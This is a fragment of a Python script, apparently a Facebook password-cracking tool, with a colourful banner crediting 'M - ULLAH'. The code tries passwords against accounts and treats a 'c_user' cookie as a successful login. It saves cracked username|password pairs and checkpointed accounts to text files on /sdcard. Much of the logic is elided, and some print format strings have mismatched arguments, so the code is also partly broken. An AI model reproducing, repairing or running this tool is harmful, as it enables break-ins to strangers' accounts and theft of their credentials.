...
\_/  \|      \____/\____/\____/\_/ \|\_/ \|
 ...
 '\x1b[1;91m' ☆Mr𝙧☆•─────────────────•✯ᗰ-ᑌᒪᒪᗩᕼ✯

'\x1b[1;91m'   Author      ||    M - ULLAH     

'\x1b[1;92m'   Github      ||     ERROR

'\x1b[1;93m'   FB ID       ||    YE KYA HOTA HAI😂
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/M-ULLAH-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/M-ULLAH-CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [M ULLAH-OK 🔥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/M-ULLAH_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/M-ULLAH_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      🔥✯ᗰ-ᑌᒪᒪᗩᕼ✯🔥  \033[1;37m")
